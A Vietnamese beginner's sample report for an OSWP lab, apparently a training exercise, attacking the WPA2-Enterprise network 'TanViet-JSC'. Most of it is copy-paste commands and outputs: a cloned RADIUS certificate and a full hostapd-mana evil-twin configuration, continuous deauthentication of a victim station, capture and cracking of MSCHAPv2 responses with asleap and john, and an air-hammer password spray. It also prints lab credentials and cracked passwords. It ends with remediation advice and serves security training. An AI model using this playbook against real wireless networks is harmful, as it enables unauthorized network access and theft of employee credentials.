# BÁO CÁO MẪU (BẢN ĐẦY ĐỦ CHO NGƯỜI MỚI HỌC) — OSWP
## Tấn công WPA2‑Enterprise `TanViet-JSC` bằng kỹ thuật Evil‑Twin / Rogue AP

> **Đối tượng đọc:** người mới học OSWP muốn **tự tái lập từng bước**. Mỗi yêu cầu gồm: *Mục tiêu → Kiến thức nền → Lệnh đầy đủ (copy‑paste) → Giải thích cờ → Kết quả thực tế → Ảnh*. Mọi lệnh cần quyền root đều ghi rõ `sudo`.

---

## 0. Bối cảnh & Chuẩn bị

| Hạng mục | Giá trị |
|---|---|
| Máy lab | `exam-03` (SSH `exam@172.20.10.2`, mật khẩu `kb41fqv7`) |
| Interface học viên | `wlan2` (MAC `02:00:00:00:32:00`), `wlan4` (MAC `02:00:00:00:34:00`) |
| Mạng mục tiêu | `TanViet-JSC` — BSSID `02:00:00:00:30:00`, kênh 6, WPA2/CCMP, **802.1X PEAP‑MSCHAPv2** |
| PROOF | `ENT{45aabfa09a91}` |

**Ràng buộc quan trọng của bài lab:**
- Chỉ dùng: `iw, tshark, tcpdump, aircrack-ng, hostapd-mana, openssl, asleap, genkeys, john, hashcat, wpa_supplicant, dhclient, curl, air-hammer`.
- **CẤM `airmon-ng`** (kể cả `airmon-ng start` và `airmon-ng check kill`) → ta bật monitor bằng **`iw`**.
- Không dừng/sửa cấu hình dịch vụ `exam-*`; chỉ dùng `/opt/exam/wordlist.txt`.

### Kiến thức nền tối thiểu (đọc trước)
- **WPA2‑Enterprise (802.1X)**: thay vì một mật khẩu chung (PSK), mỗi người dùng có tài khoản riêng, xác thực qua máy chủ RADIUS bằng **EAP**.
- **PEAP‑MSCHAPv2**: EAP phổ biến nhất. Client mở một "đường hầm" **TLS** tới RADIUS (giống HTTPS), bên trong chạy **MSCHAPv2** (một cơ chế challenge/response dựa trên NT‑hash của mật khẩu).
- **Điểm yếu bị khai thác**: nếu client **không kiểm tra chứng thư** của RADIUS, kẻ tấn công dựng **AP giả (evil‑twin)** với cùng tên mạng và một chứng thư "trông giống thật". Client vô tình bắt tay TLS với ta → ta đọc được MSCHAPv2 challenge/response bên trong → crack ra mật khẩu offline.
- **hostapd‑mana (WPE)**: bản hostapd chuyên dụng để làm evil‑twin, tự động ghi lại challenge/response ở các định dạng sẵn sàng cho `asleap`/`john`/`hashcat`.

### Kết nối và quyền
```bash
ssh exam@172.20.10.2            # nhập mật khẩu: kb41fqv7
sudo -v                         # nâng quyền root (nhập lại kb41fqv7). Hầu hết lệnh 802.11 cần root.
```

**Chuẩn hoá interface về baseline `managed`** (trước khi bắt đầu):
```bash
for i in wlan2 wlan4; do
  sudo ip link set $i down
  sudo iw dev $i set type managed
  sudo ip link set $i up
done
```

---

## Yêu cầu 1 — Liệt kê interface, trạng thái ban đầu và dải tần hỗ trợ

**Mục tiêu:** biết ta có card nào, MAC, đang ở chế độ gì, hỗ trợ băng tần/kênh nào.

**Lệnh đầy đủ:**
```bash
# 1) Liệt kê mọi interface không dây + chế độ + MAC
iw dev

# 2) Trạng thái & MAC gọn
ip -br link show wlan2
ip -br link show wlan4
cat /sys/class/net/wlan2/address
cat /sys/class/net/wlan2/operstate

# 3) Dải tần hỗ trợ: trước tiên map interface -> phy, rồi xem thông tin phy
cat /sys/class/net/wlan2/phy80211/name          # ví dụ in ra: phy2
iw phy phy2 info | grep -E '\* [0-9]{4}(\.[0-9])? MHz' | grep -v disabled
```
**Giải thích:** `iw dev` liệt kê interface; `ip -br link` in trạng thái gọn; mỗi interface gắn với một "phy" (radio vật lý), `iw phy <phy> info` cho biết các tần số/kênh được phép.

**Kết quả:**

| Interface | MAC | Trạng thái ban đầu | Dải tần hỗ trợ |
|---|---|---|---|
| wlan2 | `02:00:00:00:32:00` | `type managed`, up | 2.4 GHz (kênh 1–14) + 5 GHz (kênh 36–165) |
| wlan4 | `02:00:00:00:34:00` | `type managed`, up | 2.4 GHz (kênh 1–14) + 5 GHz (kênh 36–165) |

![R1](screenshots/01_interfaces.png)

---

## Yêu cầu 2 — Đưa một interface về monitor mode (nhận mọi frame)

**Mục tiêu:** để bắt được **mọi** khung 802.11 trên không khí (kể cả của thiết bị khác), card phải ở chế độ **monitor** (không phải managed).

**Kiến thức nền:** managed = chỉ nhận khung gửi cho mình; monitor = nhận tất cả + thêm **radiotap header** (thông tin tầng vật lý). Vì lab **cấm `airmon-ng`**, ta dùng `iw`.

**Lệnh đầy đủ:**
```bash
sudo ip link set wlan2 down
sudo iw dev wlan2 set type monitor
sudo ip link set wlan2 up
```
**Cách xác nhận:**
```bash
iw dev wlan2 info | grep type          # kỳ vọng: type monitor
ip -d link show wlan2                   # kỳ vọng: link/ieee802.11/radiotap, cờ PROMISC, promiscuity 1
```
**Giải thích:** phải `set ... down` trước khi đổi type (không đổi được khi interface đang up). `ip -d link` (`-d` = chi tiết) cho thấy cờ `PROMISC` và link‑type radiotap → đúng chế độ nghe toàn bộ.

![R2](screenshots/02_monitor.png)

---

## Yêu cầu 3 — Thu toàn bộ lưu lượng trong 120 giây ra một file

**Mục tiêu:** ghi lại 120 giây không khí trên kênh của mạng mục tiêu để phân tích offline.

**Lệnh đầy đủ:**
```bash
sudo iw dev wlan2 set channel 6                                   # khoá kênh 6 (kênh của TanViet-JSC)
sudo timeout 120 tcpdump -i wlan2 -s 0 -w /tmp/cap120.pcap        # thu 120 giây ra file pcap

# Đếm số frame thu được:
capinfos /tmp/cap120.pcap | grep -E 'Number of packets|Capture duration'
tshark -r /tmp/cap120.pcap | wc -l
```
**Giải thích cờ:** `timeout 120` = tự dừng sau 120s; `-i wlan2` = card nghe; `-s 0` = chụp trọn gói (không cắt); `-w file` = ghi ra pcap. `capinfos` in thống kê file pcap.

> Mẹo: một card chỉ nghe **một kênh** tại một thời điểm. Ta khoá kênh 6 để lấy trọn phiên EAP. (Muốn xem tất cả mạng ở mọi kênh thì dùng `airodump-ng` nhảy kênh — xem R4.)

**Kết quả:** **3001 frames** trong `/tmp/cap120.pcap` (thời lượng ≈ 123,9 s).

![R3](screenshots/03_capture.png)

---

## Yêu cầu 4 — Danh sách mạng (tên/kênh/mã hoá/xác thực) và station từng mạng

**Mục tiêu:** vẽ bản đồ vô tuyến: có những mạng nào, ai (station) đang kết nối vào đâu.

**Lệnh đầy đủ:**
```bash
# Quét toàn bộ băng 2.4GHz (nhảy kênh), ghi ra CSV để đọc:
sudo timeout 25 airodump-ng --band bg --write /tmp/recon --output-format csv wlan2
cat /tmp/recon-01.csv                       # phần trên = mạng (AP), phần dưới = station

# Lấy danh sách station của mạng 802.1X trực tiếp từ capture (theo EAP identity):
tshark -r /tmp/cap120.pcap -Y 'eap.identity' -T fields -e wlan.sa -e eap.identity | sort -u
```
**Giải thích:** `airodump-ng --band bg` quét băng 2.4GHz; cột `AUTH` = cơ chế xác thực (`PSK` hay `MGT`=802.1X). File CSV có 2 phần: danh sách AP và danh sách station kèm BSSID chúng bám vào.

**Bảng mạng:**

| BSSID | Kênh | Mã hoá | Cipher | Xác thực | ESSID |
|---|---|---|---|---|---|
| 02:00:00:00:35:00 | 1 | WPA2 | CCMP | PSK | VNPT-A1B2 |
| **02:00:00:00:30:00** | **6** | WPA2 | CCMP | **MGT (802.1X)** | **TanViet-JSC** |
| 02:00:00:00:36:00 | 9 | WPA2 | CCMP | PSK | Viettel-3C4D |
| 02:00:00:00:37:00 | 11 | WPA2 | CCMP | PSK | FPT-5E6F |

**Bảng station (mạng mục tiêu):** `02:00:00:00:31:00` (`TANVIET\nhung.lethimy`), `02:00:00:00:33:00` (`TANVIET\dung.phamtien`).

![R4](screenshots/04_networks.png)

---

## Yêu cầu 5 — Mạng nào dùng 802.1X thay vì PSK, dựa vào trường nào

**Mục tiêu:** chứng minh (bằng gói tin) mạng nào là Enterprise.

**Lệnh đầy đủ:**
```bash
tshark -r /tmp/cap120.pcap -Y 'wlan.fc.type_subtype==8' -T fields \
       -e wlan.ssid -e wlan.rsn.akms.type | sort -u
```
**Giải thích:** `wlan.fc.type_subtype==8` = chỉ lấy **beacon**. Trường quyết định là **RSN → AKM Suite** (`wlan.rsn.akms.type`):
- `2` = **PSK** (khoá chia sẻ trước).
- `1` = **802.1X** (Enterprise/EAP).

**Kết quả:** SSID `TanViet-JSC` có `wlan.rsn.akms.type = 1` → **802.1X**; ba mạng còn lại = `2` (PSK). `airodump-ng` biểu diễn khác biệt này ở cột `AUTH` (`MGT` vs `PSK`).

![R5](screenshots/05_8021x.png)

---

## Yêu cầu 6 — Tên tài khoản station gửi khi xác thực

**Mục tiêu:** lấy username thật của người dùng (gửi ở dạng rõ trong EAP‑Identity, trước khi vào TLS).

**Lệnh đầy đủ:**
```bash
tshark -r /tmp/cap120.pcap -Y 'eap.identity' -T fields \
       -e frame.number -e wlan.sa -e eap.identity | sort -u
```
**Kết quả:**

| Frame | Station | Tài khoản (EAP‑Identity) |
|---|---|---|
| 1835 | 02:00:00:00:31:00 | `TANVIET\nhung.lethimy` |
| 1838 | 02:00:00:00:33:00 | `TANVIET\dung.phamtien` |

![R6](screenshots/06_identity.png)

---

## Yêu cầu 7 — Frame chứa chứng thư của EAP server

**Mục tiêu:** tìm gói mang chứng thư (Certificate) mà RADIUS gửi trong bắt tay TLS.

**Lệnh đầy đủ:**
```bash
tshark -r /tmp/cap120.pcap -Y 'tls.handshake.type==11' -T fields \
       -e frame.number -e frame.len -e frame.protocols -e tls.handshake.certificates_length
```
**Giải thích:** `tls.handshake.type==11` = bản tin **Certificate** của TLS.

**Kết quả:**

| Thuộc tính | Giá trị |
|---|---|
| Số hiệu frame | **1843** và **1848** |
| Độ dài | **1171 bytes**/frame |
| Giao thức | 802.11 → LLC → **EAPOL → EAP‑PEAP(TLS) → X.509** |
| Chuỗi chứng thư | 2104 bytes (server + Root CA) |

![R7](screenshots/07_certframe.png)

---

## Yêu cầu 8 — Các trường chứng thư (subject & issuer)

**Mục tiêu:** đọc mọi trường của chứng thư server để lát nữa **làm giả** cho AP của ta.

**Lệnh đầy đủ (2 bước: trích DER → giải mã):**
```bash
# Bước 1: rút byte chứng thư đầu tiên (server) từ pcap -> file DER
tshark -r /tmp/cap120.pcap -Y 'tls.handshake.type==11' -T fields -e tls.handshake.certificate \
  | head -1 | awk '{print $1}' | tr -d ':' | xxd -r -p > /tmp/server_cert.der

# Bước 2: giải mã chứng thư
openssl x509 -inform DER -in /tmp/server_cert.der -noout \
        -subject -issuer -serial -startdate -enddate -nameopt multiline
```
**Giải thích:** trường `tls.handshake.certificate` là hex ngăn cách bởi `:`; `tr -d ':'` bỏ dấu `:`, `xxd -r -p` đổi hex→nhị phân (DER). `openssl x509 -nameopt multiline` in từng trường trên một dòng.

**Kết quả:**

| Trường | Subject (server) | Issuer (CA) |
|---|---|---|
| Country (C) | VN | VN |
| State (ST) | Ha Noi | Ha Noi |
| City (L) | Cau Giay | Cau Giay |
| Org (O) | TanViet JSC | TanViet JSC |
| Org Unit (OU) | Phong CNTT | Phong CNTT |
| Hostname (CN) | radius.tanviet.local | TanViet JSC Root CA |
| Email | it-support@tanviet.local | ca-admin@tanviet.local |
| **Serial** | **03E9** | — |
| **Thời hạn** | Sep 20 08:33:31 2026 GMT → Sep 17 08:33:31 2036 GMT | — |

![R8](screenshots/08_certfields.png)

---

## Yêu cầu 9 — Dựng Access Point mạo danh trên wlan4 (chứng thư cùng trường)

**Mục tiêu:** dựng evil‑twin cùng tên/kênh, với chứng thư sao chép đúng các trường vừa đọc.

### 9.1 Sinh chứng thư (CA + server) khớp các trường
```bash
mkdir -p /tmp/mana && cd /tmp/mana
SUBJ_CA="/C=VN/ST=Ha Noi/L=Cau Giay/O=TanViet JSC/OU=Phong CNTT/CN=TanViet JSC Root CA/emailAddress=ca-admin@tanviet.local"
SUBJ_SRV="/C=VN/ST=Ha Noi/L=Cau Giay/O=TanViet JSC/OU=Phong CNTT/CN=radius.tanviet.local/emailAddress=it-support@tanviet.local"

# Root CA (khớp trường Issuer)
openssl genrsa -out ca.key 2048
openssl req -x509 -new -nodes -key ca.key -sha256 -days 3650 \
        -subj "$SUBJ_CA" -addext basicConstraints=critical,CA:TRUE -out ca.pem

# Server cert (khớp trường Subject), ký bởi CA, serial 1001 = 0x3E9
openssl genrsa -out server.key 2048
openssl req -new -key server.key -subj "$SUBJ_SRV" -out server.csr
openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key -CAcreateserial \
        -days 3650 -sha256 -set_serial 1001 -out server.pem

# Tham số Diffie-Hellman (hostapd yêu cầu >= 2048-bit)
openssl dhparam -out dh.pem 2048

# Kiểm chứng subject rogue trùng với chứng thư bắt được:
openssl x509 -in server.pem -noout -subject
```
> **Lỗi hay gặp:** dùng `dhparam 1024` sẽ bị OpenSSL từ chối ("dh key too small"). Phải **2048**.

### 9.2 File `eap_user` (`/tmp/mana/hostapd.eap_user`)
```
*       PEAP,TTLS,TLS,FAST,MD5,GTC
"t"     MSCHAPV2,MD5,GTC,TTLS-MSCHAPV2,TTLS-MSCHAP,TTLS-PAP,TTLS-CHAP   "password"  [2]
```

### 9.3 File cấu hình `/tmp/mana/hostapd-mana.conf` (ĐẦY ĐỦ)
```ini
interface=wlan4
driver=nl80211
ssid=TanViet-JSC
hw_mode=g
channel=6
auth_algs=1
# ---- WPA2-Enterprise (802.1X / EAP) ----
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/tmp/mana/hostapd.eap_user
ca_cert=/tmp/mana/ca.pem
server_cert=/tmp/mana/server.pem
private_key=/tmp/mana/server.key
dh_file=/tmp/mana/dh.pem
# ---- MANA / WPE: ghi lại challenge/response ----
enable_mana=1
mana_loud=1
mana_wpe=1
mana_credout=/tmp/mana/mana.creds
mana_eapsuccess=1
mana_eaptls=0
```

### 9.4 Bật AP (chạy nền) và xác nhận
```bash
sudo ip link set wlan4 down; sudo iw dev wlan4 set type managed; sudo ip link set wlan4 up
sudo hostapd-mana /tmp/mana/hostapd-mana.conf &     # chạy nền; chờ dòng "AP-ENABLED"
iw dev wlan4 info | grep -E 'ssid|type|channel'     # kỳ vọng: ssid TanViet-JSC / type AP / channel 6
```
**Kết quả:** `wlan4: AP-ENABLED`; subject rogue **trùng khớp tuyệt đối** với chứng thư bắt được.

![R9](screenshots/09_rogueap.png)

---

## Yêu cầu 10 — Buộc station rời AP thật và liên kết vào AP giả

**Mục tiêu:** dùng deauth để "đá" station khỏi AP thật; nó sẽ tự kết nối lại vào evil‑twin cùng SSID.

**Kiến thức nền:** frame **deauthentication** không được bảo vệ (nếu chưa bật 802.11w). Ta mạo danh AP thật gửi deauth cho station → station rớt mạng → quét lại → bám vào AP của ta.

**Lệnh đầy đủ** (chạy trên `wlan2` đang ở monitor, kênh 6):
```bash
sudo iw dev wlan2 set channel 6
sudo aireplay-ng --deauth 0 -a 02:00:00:00:30:00 -c 02:00:00:00:31:00 wlan2
```
**Giải thích cờ:** `--deauth 0` = gửi liên tục (0 = vô hạn; dùng số như `--deauth 5` để gửi 5 loạt); `-a` = BSSID AP thật; `-c` = MAC station nạn nhân; tham số cuối là interface phát.

**Kết quả quan sát (log hostapd‑mana):**
```
wlan4: STA 02:00:00:00:31:00 IEEE 802.11: associated (aid 1)
MANA EAP Identity Phase 1: TANVIET\nhung.lethimy
```

![R10/R11](screenshots/10_11_creds.png)

---

## Yêu cầu 11 — Thu và ghi lại cặp challenge–response

**Mục tiêu:** đọc MSCHAPv2 challenge/response mà hostapd‑mana đã bắt.

**Lệnh đầy đủ:**
```bash
cat /tmp/mana/mana.creds
```
**Kết quả:**

| Thành phần | Giá trị |
|---|---|
| Tài khoản | `TANVIET\nhung.lethimy` |
| Challenge | `0c:02:22:e4:34:69:18:2c` |
| Response | `9a:49:57:47:ac:cd:f7:6c:ea:7f:df:cb:6d:6e:44:d4:2b:4d:f7:01:e2:7d:77:19` |

hostapd‑mana còn xuất sẵn 3 định dạng (asleap / JtR‑NETNTLM / hashcat) trong cùng file để nạp thẳng cho công cụ crack.

---

## Yêu cầu 12 — Khôi phục mật khẩu bằng HAI công cụ (đo `time`)

**Mục tiêu:** từ challenge/response, dò lại mật khẩu bằng `wordlist.txt` với hai công cụ khác nhau và đo thời gian.

### Công cụ 1 — asleap (cần genkeys tiền tính bảng NT‑hash)
```bash
# Bước chuyển đổi định dạng: wordlist -> bảng tra NT-hash cho asleap
genkeys -r /opt/exam/wordlist.txt -f /tmp/mana/words.dat -n /tmp/mana/words.idx

# Khôi phục (đo bằng time)
time asleap -C 0c:02:22:e4:34:69:18:2c \
            -R 9a:49:57:47:ac:cd:f7:6c:ea:7f:df:cb:6d:6e:44:d4:2b:4d:f7:01:e2:7d:77:19 \
            -f /tmp/mana/words.dat -n /tmp/mana/words.idx
```
### Công cụ 2 — john (định dạng NetNTLM)
```bash
# Tạo file hash NetNTLM (challenge/response lấy từ mana.creds)
echo 'nhung.lethimy:$NETNTLM$0c0222e43469182c$9a495747accdf76cea7fdfcb6d6e44d42b4df701e27d7719:::::::' > /tmp/mana/nhung.jtr

# Khôi phục (đo bằng time)
time john --format=netntlm --wordlist=/opt/exam/wordlist.txt /tmp/mana/nhung.jtr
john --format=netntlm --show /tmp/mana/nhung.jtr
```

**Kết quả — Mật khẩu: `Xuanmai#1907`** (NT hash `0790700625a282f4816c4b62de9c9d2f`)

| Công cụ | Dòng `real` (từ `time`) | Cách chuyển đổi định dạng |
|---|---|---|
| **asleap** | **0m0.015s** | `genkeys` dựng bảng NT‑hash từ wordlist |
| **john** | **0m0.704s** | challenge/response → chuỗi `$NETNTLM$...` (mana xuất sẵn) |

![R12](screenshots/12_crack.png)

---

## Yêu cầu 13 — Kết nối mạng thật bằng tài khoản đã khôi phục & tải HTTP tại gateway

**Mục tiêu:** dùng đúng tài khoản/mật khẩu để vào mạng thật, nhận IP, rồi tải toàn bộ nội dung web ở gateway.

### 13.1 File `wpa_supplicant` (`/tmp/wpa_tanviet.conf`)
```ini
ctrl_interface=/run/wpa_supplicant
network={
    ssid="TanViet-JSC"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="TANVIET\\nhung.lethimy"
    password="Xuanmai#1907"
    phase2="auth=MSCHAPV2"
}
```
> **Chú ý escaping:** trong file `wpa_supplicant`, `\` là ký tự thoát. Muốn identity thật là `TANVIET\nhung.lethimy` phải viết **hai** dấu `\\`.

### 13.2 Kết nối, nhận IP, tải web
```bash
# Trước khi kết nối: dừng AP giả để không tự bám vào chính mình
sudo pkill -f hostapd-mana ; sudo pkill -f aireplay-ng
sudo ip link set wlan2 down; sudo iw dev wlan2 set type managed; sudo ip link set wlan2 up

sudo wpa_supplicant -B -D nl80211 -i wlan2 -c /tmp/wpa_tanviet.conf   # -B = chạy nền
wpa_cli -i wlan2 status | grep -E 'wpa_state|EAP state'              # kỳ vọng: COMPLETED / SUCCESS

sudo dhclient -v wlan2                                                # xin IP qua DHCP
ip -4 addr show wlan2 ; ip route | grep default                      # xem IP + gateway

# Tải toàn bộ nội dung HTTP tại gateway
cd /tmp/loot 2>/dev/null || mkdir -p /tmp/loot && cd /tmp/loot
for f in $(curl -s http://10.13.6.1/ | grep -oE 'href="[^"]+"' | sed 's/href="//;s/"//'); do
  curl -s -O http://10.13.6.1/$f
done
ls -l
```
**Kết quả:**

| Thông số | Giá trị |
|---|---|
| IP nhận được | **10.13.6.108/24** |
| Gateway | **10.13.6.1** |
| File đã tải | `proof.txt`, `users.csv`, `New-TanVietADUsers.ps1` |

![R13](screenshots/13_connect.png)

---

## Yêu cầu 14 — Mật khẩu mặc định cấp cho nhân viên mới + nguồn

**Mục tiêu:** tìm mật khẩu mặc định tổ chức đặt cho tài khoản mới, và trích dẫn nguồn.

**Lệnh đầy đủ:**
```bash
grep -n -B2 DefaultPassword /tmp/loot/New-TanVietADUsers.ps1     # in dòng + 2 dòng chú thích phía trên
printf '%s' 'T4nviet@2O26' | xxd                                # xác định O hoa hay số 0
```
**Giải thích:** dùng `xxd` để phân biệt ký tự dễ nhầm: byte `0x4f` = **chữ `O` hoa** (nếu là số 0 sẽ là `0x30`).

**Kết quả:**

| Hạng mục | Giá trị |
|---|---|
| Mật khẩu mặc định | **`T4nviet@2O26`** (ký tự thứ 10 là **`O` hoa**, `0x4f`) |
| Nguồn | `New-TanVietADUsers.ps1`, **dòng 17**: `$DefaultPassword = ConvertTo-SecureString "T4nviet@2O26" ...` |
| Ngữ cảnh | Chú thích dòng 15: "Mat khau mac dinh cap cho nhan vien moi" |

![R14](screenshots/14_defaultpw.png)

---

## Yêu cầu 15 — Danh sách toàn bộ tài khoản + chuyển đổi định dạng

**Mục tiêu:** liệt kê tài khoản trong `users.csv` và đổi sang đúng định dạng mà 802.1X dùng.

**Lệnh đầy đủ:**
```bash
head -1 /tmp/loot/users.csv                       # xem header: định dạng gốc = UPN
tail -n +2 /tmp/loot/users.csv | wc -l            # đếm số tài khoản
tail -n +2 /tmp/loot/users.csv | cut -d, -f1 | head -3   # 3 tài khoản đầu (UPN)

# Chuyển đổi định dạng UPN -> sAMAccountName (bỏ phần @domain)
tail -n +2 /tmp/loot/users.csv | cut -d, -f1 | cut -d@ -f1 > /tmp/loot/users_sam.txt
```
**Giải thích:** file dùng **UPN** `user@tanviet.local`, nhưng 802.1X xác thực bằng **sAMAccountName / `TANVIET\user`**. `cut -d@ -f1` cắt lấy phần trước `@`.

**Kết quả:** **27 tài khoản**; ba đầu: `nhung.lethimy`, `dung.phamtien`, `hieu.nguyenquang`.

![R15](screenshots/15_accounts.png)

---

## Yêu cầu 16 — Spray mật khẩu mặc định lên toàn bộ danh sách (air-hammer)

**Mục tiêu:** thử mật khẩu mặc định cho tất cả tài khoản, tìm ai chưa đổi.

**Kiến thức nền:** "password spray" = thử **một** mật khẩu cho **nhiều** tài khoản (tránh khoá tài khoản). `air-hammer` làm điều này online với WPA‑Enterprise.

**Lệnh đầy đủ:**
```bash
# Dựng userlist định dạng DOMAIN\user với HAI backslash (bắt buộc cho backend D-Bus của air-hammer)
sed 's#^#TANVIET\\\\#' /tmp/loot/users_sam.txt > /tmp/loot/users_spray.txt
head -3 /tmp/loot/users_spray.txt        # kiểm tra: TANVIET\\nhung.lethimy ...

sudo pkill -f "wpa_supplicant.*wlan2"    # giải phóng wlan2 cho air-hammer
sudo ip link set wlan2 down; sudo iw dev wlan2 set type managed; sudo ip link set wlan2 up

sudo python3 /opt/exam/air-hammer/air-hammer.py -i wlan2 -e TanViet-JSC \
      -u /tmp/loot/users_spray.txt -P 'T4nviet@2O26' -t 1 -w /tmp/loot/spray_valid.csv
cat /tmp/loot/spray_valid.csv
```
**Giải thích cờ:** `-i` interface, `-e` SSID, `-u` file username, `-P` một mật khẩu thử cho mọi user, `-t 1` nghỉ 1s giữa các lần, `-w` ghi kết quả hợp lệ ra CSV.

> **Bẫy quan trọng:** air-hammer đẩy identity qua **D‑Bus** vào `wpa_supplicant`, nơi `\` bị unescape. Vì vậy trong userfile phải là **`TANVIET\\user`** (hai `\`) để EAP identity thật thành `TANVIET\user`. Nếu chỉ một `\` → tất cả đều thất bại (âm tính giả). Nên **kiểm chứng chéo** bằng `wpa_supplicant` cho vài tài khoản.

**Kết quả:**

| Hạng mục | Giá trị |
|---|---|
| Công cụ | `air-hammer` |
| Số tài khoản đã thử | **27** |
| **Còn dùng mật khẩu mặc định (3)** | `TANVIET\hieu.nguyenquang`, `TANVIET\khanh.buiduc`, `TANVIET\cuong.tranvan` |

Kiểm chứng chéo bằng `wpa_supplicant`: 3 tài khoản trên → `wpa_state=COMPLETED`; các tài khoản khác → bị từ chối (SCANNING).

![R16](screenshots/16_spray.png)

---

## Kết quả PROOF
```bash
curl -s http://10.13.6.1/proof.txt
```
```
TanViet-JSC — WPA2-Enterprise PEAP-MSCHAPv2
ENT{45aabfa09a91}
```
![proof](screenshots/17_proof.png)

---

## Bảng tra nhanh công cụ (cheat‑sheet)

| Mục đích | Công cụ | Lệnh cốt lõi |
|---|---|---|
| Xem interface/dải tần | `iw` | `iw dev` · `iw phy phyX info` |
| Bật monitor (KHÔNG airmon-ng) | `iw` | `iw dev wlan2 set type monitor` |
| Bắt gói | `tcpdump` | `tcpdump -i wlan2 -s0 -w f.pcap` |
| Quét mạng/kênh | `airodump-ng` | `airodump-ng --band bg -w recon --output-format csv wlan2` |
| Phân tích pcap | `tshark` | `tshark -r f.pcap -Y '<filter>' -T fields -e <field>` |
| Giả AP + bắt cred | `hostapd-mana` | `hostapd-mana mana.conf` |
| Deauth | `aireplay-ng` | `aireplay-ng --deauth 0 -a <AP> -c <STA> wlan2` |
| Làm chứng thư | `openssl` | `openssl req/x509/genrsa/dhparam` |
| Crack MSCHAPv2 | `asleap`,`john` | `asleap -C -R -f -n` · `john --format=netntlm` |
| Kết nối Enterprise | `wpa_supplicant` | `wpa_supplicant -B -D nl80211 -i wlan2 -c f.conf` |
| Xin IP | `dhclient` | `dhclient -v wlan2` |
| Spray mật khẩu | `air-hammer` | `air-hammer.py -i wlan2 -e SSID -u users -P pass -w out.csv` |

## Khuyến nghị khắc phục
1. **Bắt buộc client kiểm tra chứng thư server** (`ca_cert` + `domain_match`) → vô hiệu hoá evil‑twin (lỗ hổng gốc).
2. Chuyển **PEAP‑MSCHAPv2 → EAP‑TLS** (chứng thư client) để loại bỏ crack offline.
3. **Reset ngay** mật khẩu 3 tài khoản còn dùng mặc định; bật đổi mật khẩu lần đầu; bỏ mật khẩu mặc định yếu.
4. Bật **802.11w (PMF)** để giảm hiệu quả deauth.
5. Gỡ máy chủ HTTP để lộ `users.csv`/script chứa mật khẩu; không nhúng bí mật trong script triển khai.

## Phụ lục — Bằng chứng kèm theo
- `screenshots/00–17` — ảnh màn hình terminal phiên thực thi thật.
- `loot/` — `cap120.pcap`, `proof.txt`, `users.csv`, `New-TanVietADUsers.ps1`, `mana.creds`, `asleap.*`, `john.*`, `hostapd-mana.conf`, `server.pem`, `ca.pem`, `server_cert.der`, `spray_valid.csv`…
- `evidence/` — script từng bước `r01_*`→`r16_*` và log `task01`→`task16`.
